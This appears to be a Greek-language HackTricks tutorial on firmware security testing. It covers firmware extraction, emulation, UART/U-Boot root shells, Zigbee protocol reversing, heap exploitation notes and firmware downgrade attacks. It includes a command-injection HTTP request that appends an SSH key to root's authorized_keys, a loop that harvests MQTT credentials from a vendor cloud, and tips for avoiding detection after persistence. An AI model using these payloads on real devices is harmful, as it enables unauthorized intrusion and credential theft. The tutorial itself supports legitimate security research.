# Ανάλυση Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Εισαγωγή**

### Σχετικοί πόροι


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Το firmware είναι απαραίτητο software που επιτρέπει στις συσκευές να λειτουργούν σωστά, διαχειριζόμενο και διευκολύνοντας την επικοινωνία μεταξύ των hardware components και του software με το οποίο αλληλεπιδρούν οι χρήστες. Αποθηκεύεται σε μόνιμη μνήμη, διασφαλίζοντας ότι η συσκευή μπορεί να έχει πρόσβαση σε κρίσιμες οδηγίες από τη στιγμή που ενεργοποιείται, οδηγώντας στην εκκίνηση του operating system. Η εξέταση και η πιθανή τροποποίηση του firmware αποτελεί κρίσιμο βήμα για τον εντοπισμό security vulnerabilities.

## **Συλλογή πληροφοριών**

Η **συλλογή πληροφοριών** αποτελεί κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Αυτή η διαδικασία περιλαμβάνει τη συλλογή δεδομένων σχετικά με:

- Την αρχιτεκτονική του CPU και το operating system που εκτελεί
- Τα χαρακτηριστικά του bootloader
- Τη διάταξη του hardware και τα datasheets
- Μετρήσεις του codebase και τοποθεσίες του source code
- External libraries και τύπους licenses
- Ιστορικά updates και regulatory certifications
- Διαγράμματα αρχιτεκτονικής και ροής
- Security assessments και εντοπισμένες vulnerabilities

Για αυτόν τον σκοπό, τα εργαλεία **open-source intelligence (OSINT)** είναι πολύτιμα, όπως και η ανάλυση τυχόν διαθέσιμων open-source software components μέσω manual και automated review processes. Εργαλεία όπως τα [Coverity Scan](https://scan.coverity.com) και [Semmle’s LGTM](https://lgtm.com/#explore) προσφέρουν δωρεάν static analysis, την οποία μπορείτε να αξιοποιήσετε για τον εντοπισμό πιθανών προβλημάτων.

## **Απόκτηση του Firmware**

Η απόκτηση firmware μπορεί να γίνει με διάφορους τρόπους, καθένας από τους οποίους έχει διαφορετικό επίπεδο πολυπλοκότητας:

- **Απευθείας** από την πηγή (developers, manufacturers)
- Με **Building** βάσει των παρεχόμενων οδηγιών
- Με **Downloading** από επίσημα support sites
- Με χρήση ερωτημάτων **Google dork** για την εύρεση hosted firmware files
- Με απευθείας πρόσβαση σε **cloud storage**, μέσω εργαλείων όπως το [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Με interception των **updates** μέσω man-in-the-middle techniques
- Με **Extracting** από τη συσκευή μέσω συνδέσεων όπως **UART**, **JTAG** ή **PICit**
- Με **Sniffing** για update requests στο πλαίσιο της επικοινωνίας της συσκευής
- Με τον εντοπισμό και τη χρήση **hardcoded update endpoints**
- Με **Dumping** από τον bootloader ή το network
- Με **Removing and reading** το storage chip, όταν όλα τα άλλα αποτυγχάνουν, χρησιμοποιώντας τα κατάλληλα hardware tools

### Logs μόνο μέσω UART: εξαναγκασμός root shell μέσω του U-Boot env στο flash

Αν το UART RX αγνοείται (μόνο logs), μπορείτε και πάλι να εξαναγκάσετε ένα init shell **επεξεργαζόμενοι το U-Boot environment blob** offline:

1. Κάντε dump του SPI flash με SOIC-8 clip και programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Εντοπίστε το U-Boot env partition, επεξεργαστείτε το `bootargs` ώστε να περιλαμβάνει `init=/bin/sh` και **υπολογίστε ξανά το U-Boot env CRC32** για το blob.
3. Κάντε reflash μόνο στο env partition και επανεκκινήστε. Ένα shell θα πρέπει να εμφανιστεί στο UART.

Αυτό είναι χρήσιμο σε embedded devices όπου το bootloader shell είναι απενεργοποιημένο, αλλά το env partition είναι writable μέσω external flash access.

## Ανάλυση του firmware

Τώρα που **έχετε το firmware**, πρέπει να εξαγάγετε πληροφορίες σχετικά με αυτό, ώστε να γνωρίζετε πώς να το χειριστείτε. Υπάρχουν διάφορα εργαλεία που μπορείτε να χρησιμοποιήσετε για αυτό:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Αν δεν βρείτε πολλά με αυτά τα εργαλεία, ελέγξτε το **entropy** της εικόνας με `binwalk -E <bin>`. Αν το entropy είναι χαμηλό, τότε πιθανότατα δεν είναι κρυπτογραφημένη. Αν το entropy είναι υψηλό, είναι πιθανό να είναι κρυπτογραφημένη (ή συμπιεσμένη με κάποιον τρόπο).

Επιπλέον, μπορείτε να χρησιμοποιήσετε αυτά τα εργαλεία για να εξαγάγετε **αρχεία ενσωματωμένα μέσα στο firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ή το [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) για να επιθεωρήσετε το αρχείο.

### Λήψη του Filesystem

Με τα προηγούμενα εργαλεία, όπως το `binwalk -ev <bin>`, θα πρέπει να έχετε καταφέρει να **εξαγάγετε το filesystem**.\
Το Binwalk συνήθως το εξάγει μέσα σε έναν **φάκελο με όνομα ίδιο με τον τύπο του filesystem**, ο οποίος συνήθως είναι ένας από τους εξής: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Χειροκίνητη Εξαγωγή του Filesystem

Μερικές φορές, το binwalk **δεν θα έχει το magic byte του filesystem στις signatures του**. Σε αυτές τις περιπτώσεις, χρησιμοποιήστε το binwalk για να **βρείτε το offset του filesystem και να κάνετε carve το συμπιεσμένο filesystem** από το binary και, στη συνέχεια, να **εξαγάγετε χειροκίνητα** το filesystem σύμφωνα με τον τύπο του, χρησιμοποιώντας τα παρακάτω βήματα.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Εκτελέστε την ακόλουθη **dd command** για την εξαγωγή του filesystem Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Εναλλακτικά, θα μπορούσε να εκτελεστεί και η ακόλουθη εντολή.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Για squashfs (που χρησιμοποιείται στο παραπάνω παράδειγμα)

`$ unsquashfs dir.squashfs`

Τα αρχεία θα βρίσκονται στη συνέχεια στον κατάλογο "`squashfs-root`".

- Αρχεία archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Για filesystems jffs2

`$ jefferson rootfsfile.jffs2`

- Για filesystems ubifs με NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Ανάλυση Firmware

Μόλις αποκτηθεί το firmware, είναι απαραίτητο να αναλυθεί λεπτομερώς για την κατανόηση της δομής του και των πιθανών ευπαθειών του. Αυτή η διαδικασία περιλαμβάνει τη χρήση διαφόρων εργαλείων για την ανάλυση και την εξαγωγή χρήσιμων δεδομένων από το firmware image.

### Εργαλεία αρχικής ανάλυσης

Παρέχεται ένα σύνολο εντολών για την αρχική επιθεώρηση του binary file (στο οποίο γίνεται αναφορά ως `<bin>`). Αυτές οι εντολές βοηθούν στον προσδιορισμό των τύπων αρχείων, στην εξαγωγή strings, στην ανάλυση binary data και στην κατανόηση των λεπτομερειών των partitions και των filesystems:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Για την αξιολόγηση της κατάστασης κρυπτογράφησης του image, ελέγχεται το **entropy** με `binwalk -E <bin>`. Χαμηλό entropy υποδηλώνει έλλειψη κρυπτογράφησης, ενώ υψηλό entropy υποδεικνύει πιθανή κρυπτογράφηση ή συμπίεση.

Για την εξαγωγή **embedded files**, συνιστώνται εργαλεία και resources όπως το documentation **file-data-carving-recovery-tools** και το **binvis.io** για επιθεώρηση αρχείων.

### Εξαγωγή του Filesystem

Με τη χρήση του `binwalk -ev <bin>`, συνήθως μπορεί να εξαχθεί το filesystem, συχνά σε έναν κατάλογο με όνομα που αντιστοιχεί στον τύπο του filesystem (π.χ. squashfs, ubifs). Ωστόσο, όταν το **binwalk** αποτυγχάνει να αναγνωρίσει τον τύπο του filesystem λόγω απουσίας magic bytes, απαιτείται χειροκίνητη εξαγωγή. Αυτό περιλαμβάνει τη χρήση του `binwalk` για τον εντοπισμό του offset του filesystem και, στη συνέχεια, την εντολή `dd` για την αποκοπή του filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Στη συνέχεια, ανάλογα με τον τύπο του filesystem (π.χ. squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για τη χειροκίνητη εξαγωγή των περιεχομένων.

### Ανάλυση Filesystem

Με το filesystem εξαχθέν, ξεκινά η αναζήτηση security flaws. Η προσοχή επικεντρώνεται σε μη ασφαλή network daemons, hardcoded credentials, API endpoints, λειτουργίες update server, μη μεταγλωττισμένο κώδικα, startup scripts και compiled binaries για offline analysis.

**Βασικές τοποθεσίες** και **στοιχεία** προς έλεγχο περιλαμβάνουν:

- Τα **etc/shadow** και **etc/passwd** για user credentials
- SSL certificates και keys στο **etc/ssl**
- Αρχεία configuration και scripts για πιθανές vulnerabilities
- Embedded binaries για περαιτέρω analysis
- Συνηθισμένους web servers και binaries συσκευών IoT

Αρκετά tools βοηθούν στην αποκάλυψη sensitive information και vulnerabilities μέσα στο filesystem:

- Τα [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για αναζήτηση sensitive information
- Το [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για comprehensive firmware analysis
- Τα [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) και [**EMBA**](https://github.com/e-m-b-a/emba) για static και dynamic analysis

### Security Checks σε Compiled Binaries

Τόσο ο source code όσο και τα compiled binaries που εντοπίζονται στο filesystem πρέπει να ελέγχονται σχολαστικά για vulnerabilities. Tools όπως το **checksec.sh** για Unix binaries και το **PESecurity** για Windows binaries βοηθούν στον εντοπισμό μη προστατευμένων binaries που θα μπορούσαν να γίνουν exploit.

## Συλλογή cloud config και MQTT credentials μέσω derived URL tokens

Πολλά IoT hubs λαμβάνουν το per-device configuration τους από ένα cloud endpoint που έχει τη μορφή:

- `https://<api-host>/pf/<deviceId>/<token>`

Κατά τη διάρκεια του firmware analysis μπορεί να διαπιστώσετε ότι το `<token>` προκύπτει τοπικά από το device ID χρησιμοποιώντας ένα hardcoded secret, για παράδειγμα:

- token = MD5( deviceId || STATIC_KEY ) και αναπαρίσταται ως uppercase hex

Αυτός ο σχεδιασμός επιτρέπει σε οποιονδήποτε γνωρίζει ένα deviceId και το STATIC_KEY να ανακατασκευάσει το URL και να κατεβάσει το cloud config, αποκαλύπτοντας συχνά plaintext MQTT credentials και topic prefixes.

Πρακτικό workflow:

1) Εξαγωγή του deviceId από τα UART boot logs

- Συνδέστε έναν 3.3V UART adapter (TX/RX/GND) και καταγράψτε τα logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Αναζητήστε γραμμές που εκτυπώνουν το URL pattern του cloud config και τη διεύθυνση του broker, για παράδειγμα:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Ανάκτηση των STATIC_KEY και του αλγορίθμου token από το firmware

- Φορτώστε τα binaries στο Ghidra/radare2 και αναζητήστε το config path (`"/pf/"`) ή χρήση του MD5.
- Επιβεβαιώστε τον αλγόριθμο (π.χ. `MD5(deviceId||STATIC_KEY)`).
- Παράγετε το token σε Bash και μετατρέψτε το digest σε κεφαλαία:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Συλλογή cloud config και MQTT credentials

- Δημιούργησε το URL και ανάκτησε το JSON με curl· κάνε parse με jq για να εξαγάγεις secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Κατάχρηση plaintext MQTT και αδύναμων ACLs θεμάτων (αν υπάρχουν)

- Χρησιμοποιήστε τα ανακτημένα διαπιστευτήρια για subscribe σε maintenance topics και αναζητήστε ευαίσθητα συμβάντα:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerate προβλέψιμα device IDs (σε κλίμακα, με authorization)

- Πολλά ecosystems ενσωματώνουν bytes του vendor OUI/product/type, ακολουθούμενα από ένα sequential suffix.
- Μπορείτε να κάνετε iterate σε candidate IDs, να παράγετε tokens και να κάνετε fetch configs programmatically:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Σημειώσεις
- Να λαμβάνετε πάντα explicit authorization πριν επιχειρήσετε mass enumeration.
- Να προτιμάτε το emulation ή το static analysis για την ανάκτηση secrets χωρίς τροποποίηση του target hardware, όταν είναι δυνατό.


Η διαδικασία emulation του firmware επιτρέπει **dynamic analysis** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να αντιμετωπίσει προκλήσεις που σχετίζονται με dependencies του hardware ή της architecture, όμως η μεταφορά του root filesystem ή συγκεκριμένων binaries σε μια συσκευή με matching architecture και endianness, όπως ένα Raspberry Pi, ή σε μια pre-built virtual machine, μπορεί να διευκολύνει περαιτέρω testing.

### Emulation μεμονωμένων Binaries

Για την εξέταση μεμονωμένων προγραμμάτων, είναι κρίσιμο να προσδιοριστούν το endianness και η CPU architecture του προγράμματος.

#### Παράδειγμα με MIPS Architecture

Για την emulation ενός binary με MIPS architecture, μπορεί να χρησιμοποιηθεί η εντολή:
```bash
file ./squashfs-root/bin/busybox
```
Και για να εγκαταστήσετε τα απαραίτητα εργαλεία εξομοίωσης:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Για MIPS (big-endian), χρησιμοποιείται το `qemu-mips`, ενώ για binaries little-endian, η επιλογή θα ήταν το `qemu-mipsel`.

#### Εξομοίωση ARM Architecture

Για ARM binaries, η διαδικασία είναι παρόμοια, με τον emulator `qemu-arm` να χρησιμοποιείται για την εξομοίωση.

### Εξομοίωση Πλήρους Συστήματος

Εργαλεία όπως τα [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) και άλλα, διευκολύνουν την πλήρη εξομοίωση firmware, αυτοματοποιώντας τη διαδικασία και υποστηρίζοντας το dynamic analysis.

## Dynamic Analysis στην Πράξη

Σε αυτό το στάδιο, χρησιμοποιείται για analysis είτε ένα πραγματικό είτε ένα emulated περιβάλλον συσκευής. Είναι απαραίτητο να διατηρείται shell access στο OS και στο filesystem. Η εξομοίωση ενδέχεται να μην αναπαράγει πλήρως τις αλληλεπιδράσεις με το hardware, γεγονός που μπορεί να απαιτεί περιστασιακά restart της εξομοίωσης. Το analysis θα πρέπει να επανεξετάζει το filesystem, να εκμεταλλεύεται exposed webpages και network services και να διερευνά vulnerabilities στον bootloader. Τα tests ακεραιότητας του firmware είναι κρίσιμα για τον εντοπισμό πιθανών backdoor vulnerabilities.

## Τεχνικές Runtime Analysis

Το runtime analysis περιλαμβάνει την αλληλεπίδραση με μια process ή ένα binary στο operating environment του, χρησιμοποιώντας εργαλεία όπως τα gdb-multiarch, Frida και Ghidra για τον ορισμό breakpoints και τον εντοπισμό vulnerabilities μέσω fuzzing και άλλων τεχνικών.

Για embedded targets χωρίς full debugger, **αντιγράψτε ένα statically-linked `gdbserver`** στη συσκευή και κάντε remote attach:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Αντιστοίχιση μηνυμάτων Zigbee / radio co-processor

Στα IoT hubs, το RF stack συχνά διαχωρίζεται μεταξύ ενός **radio MCU** και μιας διεργασίας Linux userland. Μια χρήσιμη διαδικασία είναι η χαρτογράφηση της διαδρομής:

1. **RF frame** στον αέρα
2. **controller-side parser** στο radio MCU
3. **serial/UART text ή TLV protocol** που προωθείται στο Linux (για παράδειγμα `/dev/tty*`)
4. **application dispatcher** στον κύριο daemon
5. **protocol-specific handler / state machine**

Αυτή η αρχιτεκτονική δημιουργεί δύο reversing targets αντί για ένα. Αν ο controller μετατρέπει τα binary radio frames σε ένα textual protocol όπως `Group,Command,arg1,arg2,...`, εντόπισε:

- Τα **message groups** και τους dispatch tables
- Ποια messages μπορούν να προέρχονται από το **network** και ποια από τον ίδιο τον controller
- Τα ακριβή **manufacturer-specific discriminator fields** (για παράδειγμα Zigbee `manufacturer_code` και custom `cluster_command`)
- Ποιοι handlers είναι προσβάσιμοι μόνο κατά τα στάδια **commissioning**, discovery ή firmware/model download

Ειδικά για το Zigbee, κατέγραψε την κίνηση pairing και έλεγξε αν ο στόχος εξακολουθεί να χρησιμοποιεί το προεπιλεγμένο **Link Key** `ZigBeeAlliance09`. Αν ναι, το sniffing της κίνησης commissioning μπορεί να αποκαλύψει το **Network Key**. Τα install codes του Zigbee 3.0 μειώνουν αυτή την έκθεση, επομένως σημείωσε αν η συσκευή που δοκιμάστηκε τα επιβάλλει πράγματι.

### Manufacturer-specific protocol handlers και FSM-gated reachability

Οι vendor-specific εντολές Zigbee/ZCL είναι συχνά καλύτερος στόχος από τα standardized clusters, επειδή τροφοδοτούν **custom parsing code** και εσωτερικά **FSMs** με λιγότερο δοκιμασμένο validation.

Πρακτική διαδικασία:

- Κάνε reverse τον command dispatcher μέχρι να εντοπίσεις τον **vendor-only handler**.
- Ανάκτησε τους πίνακες **FSM state**, **event**, **check**, **action** και **next-state**.
- Εντόπισε τα **transitional states** που προχωρούν αυτόματα και τα retry/error branches που τελικά κάνουν reset ή free attacker-controlled state.
- Επιβεβαίωσε ποιες legitimate protocol exchanges απαιτούνται για να τοποθετηθεί ο daemon στην ευάλωτη κατάσταση, αντί να υποθέτεις ότι ο buggy handler είναι πάντα προσβάσιμος.

Για timing-sensitive protocols, το packet replay από ένα Python framework μπορεί να είναι υπερβολικά αργό. Μια πιο αξιόπιστη προσέγγιση είναι η εξομοίωση μιας legitimate συσκευής σε πραγματικό hardware (για παράδειγμα ένα **nRF52840**) με vendor-grade stack, ώστε να εκθέσεις τα σωστά **endpoints**, **attributes** και τον σωστό χρόνο commissioning.

### Κατηγορία fragmented-download bugs σε embedded daemons

Μια επαναλαμβανόμενη κατηγορία firmware bugs εμφανίζεται σε **fragmented blob/model/configuration downloads**:

1. Το **first fragment** (`offset == 0`) αποθηκεύει το `ctx->total_size` και κάνει allocate `malloc(total_size)`.
2. Τα επόμενα fragments επικυρώνουν μόνο τα attacker-controlled **packet-local** fields, όπως `packet_total_size >= offset + chunk_len`.
3. Το copy χρησιμοποιεί `memcpy(&ctx->buffer[offset], chunk, chunk_len)` χωρίς έλεγχο σε σχέση με το **original allocated size**.

Αυτό επιτρέπει σε έναν attacker να στείλει:

- Ένα πρώτο valid fragment με **small** δηλωμένο total size, ώστε να προκαλέσει μικρό heap allocation.
- Ένα μεταγενέστερο fragment με το **expected offset**, αλλά μεγαλύτερο `chunk_len`.
- Ένα forged packet-local size που ικανοποιεί τους νέους ελέγχους, ενώ εξακολουθεί να κάνει overflow στο buffer που αρχικά έγινε allocate.

Όταν το vulnerable path βρίσκεται πίσω από commissioning logic, η exploitation πρέπει να περιλαμβάνει αρκετό **device emulation**, ώστε να οδηγήσει τον στόχο στην αναμενόμενη κατάσταση model-download ή blob-download πριν από την αποστολή των malformed fragments.

### Protocol-driven `free()` triggers

Σε embedded daemons, ο ευκολότερος τρόπος για να προκληθεί heap metadata exploitation συχνά δεν είναι το «wait for cleanup», αλλά η **force** ενεργοποίηση του error handling του ίδιου του protocol:

- Στείλε malformed follow-up fragments για να οδηγήσεις το FSM σε **retry** ή **error** states.
- Ξεπέρασε το retry threshold, ώστε ο daemon να κάνει **reset context** και να απελευθερώσει το corrupted buffer.
- Χρησιμοποίησε αυτό το προβλέψιμο `free()` για να ενεργοποιήσεις allocator-side primitives πριν το process καταρρεύσει για άσχετους λόγους.

Αυτό είναι ιδιαίτερα χρήσιμο απέναντι σε **musl/uClibc/dlmalloc-like** allocators σε embedded Linux, όπου η αλλοίωση chunk metadata μπορεί να μετατρέψει τη λογική unlink/unbin σε write primitive. Ένα σταθερό pattern είναι η αλλοίωση ενός **size field** για ανακατεύθυνση του allocator traversal προς **fake chunks** που έχουν τοποθετηθεί μέσα στο overflowed buffer, αντί για άμεση καταστροφή πραγματικών bin pointers και crash του process.

## Binary Exploitation και Proof-of-Concept

Η ανάπτυξη ενός PoC για εντοπισμένα vulnerabilities απαιτεί βαθιά κατανόηση της αρχιτεκτονικής του στόχου και προγραμματισμό σε lower-level languages. Τα binary runtime protections σε embedded systems είναι σπάνια, αλλά όταν υπάρχουν, μπορεί να απαιτούνται τεχνικές όπως το Return Oriented Programming (ROP).

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** Το uClibc χρησιμοποιεί fastbins παρόμοια με το glibc. Ένα μεταγενέστερο large allocation μπορεί να ενεργοποιήσει το `__malloc_consolidate()`, επομένως κάθε fake chunk πρέπει να επιβιώνει από τους ελέγχους (sane size, `fd = 0` και surrounding chunks που θεωρούνται "in use").
- **Non-PIE binaries under ASLR:** Αν το ASLR είναι ενεργοποιημένο αλλά το κύριο binary είναι **non-PIE**, οι διευθύνσεις του in-binary `.data/.bss` είναι σταθερές. Μπορείς να στοχεύσεις μια περιοχή που ήδη μοιάζει με έγκυρο heap chunk header, ώστε να προσγειώσεις ένα fastbin allocation σε έναν **function pointer table**.
- **Parser-stopping NUL:** Όταν γίνεται parsing JSON, ένα `\x00` στο payload μπορεί να σταματήσει το parsing, διατηρώντας παράλληλα τα trailing attacker-controlled bytes για stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** Ένα ROP chain που καλεί `open("/proc/self/mem")`, `lseek()` και `write()` μπορεί να τοποθετήσει executable shellcode σε ένα γνωστό mapping και να κάνει jump σε αυτό.

## Prepared Operating Systems για Firmware Analysis

Operating systems όπως το [AttifyOS](https://github.com/adi0x90/attifyos) και το [EmbedOS](https://github.com/scriptingxss/EmbedOS) παρέχουν pre-configured environments για firmware security testing, εξοπλισμένα με τα απαραίτητα tools.

## Prepared OSs για ανάλυση Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): Το AttifyOS είναι ένα distro που προορίζεται να σε βοηθήσει να πραγματοποιείς security assessment και penetration testing σε Internet of Things (IoT) devices. Εξοικονομεί πολύ χρόνο, παρέχοντας ένα pre-configured environment με όλα τα απαραίτητα tools φορτωμένα.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system βασισμένο στο Ubuntu 18.04, preloaded με firmware security testing tools.

## Firmware Downgrade Attacks και Insecure Update Mechanisms

Ακόμη και όταν ένας vendor υλοποιεί cryptographic signature checks για firmware images, η **version rollback (downgrade) protection συχνά παραλείπεται**. Όταν ο boot- ή recovery-loader επαληθεύει μόνο την υπογραφή με embedded public key, αλλά δεν συγκρίνει το *version* (ή έναν monotonic counter) του image που γίνεται flash, ένας attacker μπορεί νόμιμα να εγκαταστήσει ένα **παλαιότερο, vulnerable firmware που εξακολουθεί να έχει valid signature** και έτσι να επαναφέρει patched vulnerabilities.

Τυπικό attack workflow:

1. **Απόκτησε ένα παλαιότερο signed image**
* Πάρε το από το public download portal, το CDN ή το support site του vendor.
* Κάνε extract από companion mobile/desktop applications (π.χ. μέσα σε ένα Android APK, κάτω από `assets/firmware/`).
* Ανάκτησέ το από third-party repositories όπως VirusTotal, Internet archives, forums κ.λπ.
2. **Κάνε upload ή serve το image στη συσκευή** μέσω οποιουδήποτε exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT κ.λπ.
* Πολλές consumer IoT συσκευές εκθέτουν *unauthenticated* HTTP(S) endpoints που δέχονται Base64-encoded firmware blobs, τα κάνουν decode server-side και ενεργοποιούν recovery/upgrade.
3. Μετά το downgrade, κάνε exploit σε ένα vulnerability που είχε γίνει patch στη νεότερη release (για παράδειγμα ένα command-injection filter που προστέθηκε αργότερα).
4. Προαιρετικά, κάνε flash ξανά το latest image ή απενεργοποίησε τα updates για να αποφύγεις τον εντοπισμό μετά την απόκτηση persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Στο ευάλωτο (υποβαθμισμένο) firmware, η παράμετρος `md5` συνενώνεται απευθείας σε μια εντολή shell χωρίς sanitisation, επιτρέποντας την injection αυθαίρετων εντολών (εδώ – την ενεργοποίηση root access μέσω SSH key). Οι μεταγενέστερες εκδόσεις firmware εισήγαγαν ένα βασικό character filter, όμως η απουσία προστασίας από downgrade καθιστά τη διόρθωση αναποτελεσματική.

### Εξαγωγή Firmware Από Mobile Apps

Πολλοί vendors ενσωματώνουν πλήρη firmware images στις companion mobile applications τους, ώστε η εφαρμογή να μπορεί να ενημερώνει τη συσκευή μέσω Bluetooth/Wi-Fi. Αυτά τα packages αποθηκεύονται συνήθως χωρίς encryption στο APK/APEX, σε paths όπως `assets/fw/` ή `res/raw/`. Εργαλεία όπως τα `apktool`, `ghidra` ή ακόμη και το απλό `unzip` επιτρέπουν την εξαγωγή signed images χωρίς πρόσβαση στο physical hardware.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Παράκαμψη anti-rollback μόνο μέσω updater σε σχεδιάσεις A/B slots

Ορισμένοι vendors υλοποιούν πράγματι ένα anti-downgrade **ratchet**, αλλά μόνο μέσα στη λογική του *updater* (για παράδειγμα, μια UDS routine μέσω CAN, μια recovery command ή ένας userspace OTA agent). Αν ο **bootloader** ελέγχει αργότερα μόνο το image signature/CRC και εμπιστεύεται το partition table ή τα slot metadata, η προστασία από rollback μπορεί και πάλι να παρακαμφθεί.

Τυπική αδύναμη σχεδίαση:

- Τα firmware metadata περιέχουν τόσο έναν version descriptor όσο και έναν **security ratchet** / monotonic counter.
- Ο updater συγκρίνει το image ratchet με μια τιμή αποθηκευμένη σε persistent storage και απορρίπτει παλαιότερα signed images.
- Ο bootloader **δεν** κάνει parse το ratchet και επαληθεύει μόνο header, CRC και signature πριν από το boot του επιλεγμένου slot.
- Η ενεργοποίηση του slot αποθηκεύεται ξεχωριστά σε partition table ή σε per-slot generation counter και **δεν είναι κρυπτογραφικά συνδεδεμένη** με το ακριβές firmware digest που επαληθεύτηκε.

Αυτό δημιουργεί ένα **validate-one-image / boot-another-image** primitive σε dual-slot systems. Αν ο attacker μπορεί να κάνει τον updater να σημειώσει το slot B ως επόμενο boot target χρησιμοποιώντας ένα current signed image και μπορεί αργότερα να αντικαταστήσει το slot B πριν από το reboot, ο bootloader μπορεί και πάλι να κάνει boot το downgraded image, επειδή εμπιστεύεται μόνο τα ήδη committed slot metadata.

Συνηθισμένο abuse pattern:

1. Κάνε upload ένα **current signed** firmware στο passive slot και εκτέλεσε την κανονική validation/switch routine, ώστε το layout να σημειώσει το slot ως next active.
2. **Μην κάνεις reboot ακόμη**. Κάνε re-enter στη slot-preparation/erase routine μέσα στην ίδια session.
3. Κάνε abuse του stale boot-state ή του stale slot-selection logic, ώστε ο updater να κάνει erase το **ίδιο physical slot** που μόλις προωθήθηκε.
4. Γράψε ένα **παλαιότερο αλλά ακόμη signed** firmware σε αυτό το slot.
5. Παράλειψε τη validation routine που επιβάλλει το ratchet και κάνε απευθείας reboot.
